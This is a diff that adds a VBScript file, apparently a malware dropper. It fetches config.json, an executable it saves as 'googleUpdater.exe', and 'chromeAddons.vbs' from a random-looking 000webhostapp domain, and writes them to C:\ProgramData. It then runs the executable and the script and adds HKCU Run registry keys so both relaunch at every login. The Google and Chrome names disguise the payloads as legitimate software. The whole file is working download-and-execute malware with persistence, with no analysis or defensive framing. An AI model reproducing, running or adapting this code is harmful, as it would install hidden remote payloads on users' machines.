@@ -1,0 +1,56 @@
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "https://sdhfjkdhkj.000webhostapp.com/trainingDiary/config.json", False
+xHttp.Send
+
+with bStrm
+    .type = 1 
+    .open
+    .write xHttp.responseBody
+    .savetofile "C:\ProgramData\config.json", 2 
+
+end with
+
+
+dim xHttp2: Set xHttp2 = createobject("Microsoft.XMLHTTP")
+dim bStrm2: Set bStrm2 = createobject("Adodb.Stream")
+xHttp2.Open "GET", "https://sdhfjkdhkj.000webhostapp.com/trainingDiary/googleupdateexe", False
+xHttp2.Send
+
+with bStrm2
+    .type = 1 
+    .open
+    .write xHttp2.responseBody
+    .savetofile "C:\ProgramData\googleUpdater.exe", 2 
+
+dim shell
+set shell=createobject("wscript.shell")
+shell.run "C:\ProgramData\googleUpdater.exe"
+set shell=nothing
+
+end with
+
+dim xHttp3: Set xHttp3 = createobject("Microsoft.XMLHTTP")
+dim bStrm3: Set bStrm3 = createobject("Adodb.Stream")
+xHttp3.Open "GET", "https://sdhfjkdhkj.000webhostapp.com/trainingDiary/chromeAddons.vbs", False
+xHttp3.Send
+
+with bStrm3
+    .type = 1 
+    .open
+    .write xHttp3.responseBody
+    .savetofile "C:\ProgramData\chromeAddons.vbs", 2 
+
+end with
+
+dim shell2
+set shell2=createobject("wscript.shell")
+shell2.run "C:\ProgramData\chromeAddons.vbs"
+set shell2=nothing
+
+
+Set objShell = WScript.CreateObject("WScript.Shell")
+objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\googleUpdater", "C:\ProgramData\googleUpdater.exe", "REG_SZ"
+
+objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\chromeAddons", "C:\ProgramData\chromeAddons.vbs", "REG_SZ"
+
